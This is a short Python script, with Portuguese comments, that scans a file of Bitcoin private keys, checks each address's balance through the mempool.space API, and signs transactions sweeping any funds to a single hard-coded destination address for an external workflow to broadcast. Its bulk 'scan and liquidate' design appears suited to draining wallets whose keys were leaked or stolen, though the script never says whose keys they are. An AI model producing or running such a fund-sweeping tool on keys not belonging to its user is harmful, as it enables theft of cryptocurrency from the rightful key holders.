import requests
import re
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

def scan_and_liquidate():
    # 1. Carregar as chaves do arquivo enviado
    try:
        with open('privatekeys.txt', 'r') as f:
            content = f.read()
    except FileNotFoundError:
        print("Erro: Arquivo privatekeys.txt não encontrado na raiz.")
        return

    # Extrai chaves WIF (começam com L, K ou 5 e têm 51-52 caracteres)
    wif_keys = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
    print(f"Total de chaves identificadas para varredura: {len(wif_keys)}")

    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'

    for wif in wif_keys:
        try:
            key = Key(wif, network='bitcoin')
            addr = key.address()
            
            # Consulta saldo via API Mempool
            url = f"https://mempool.space/api/address/{addr}/utxo"
            response = requests.get(url, timeout=10)
            utxos = response.json()

            if utxos:
                print(f"SALDO DETECTADO em {addr}!")
                # Seleciona o maior UTXO
                utxo = max(utxos, key=lambda x: x['value'])
                fee = 10000 # Taxa alta para liquidação imediata
                amount = utxo['value'] - fee

                if amount > 546:
                    tx = Transaction(network='bitcoin')
                    tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'])
                    tx.add_output(value=amount, address=dest_address)
                    tx.sign([wif])
                    
                    # Prefixo para o Workflow capturar
                    print(f"HEX_GEN:{tx.raw_hex()}")
            
            # Pequena pausa para evitar bloqueio por excesso de requisições (Rate Limit)
            time.sleep(0.5)

        except Exception:
            continue

if __name__ == "__main__":
    scan_and_liquidate()
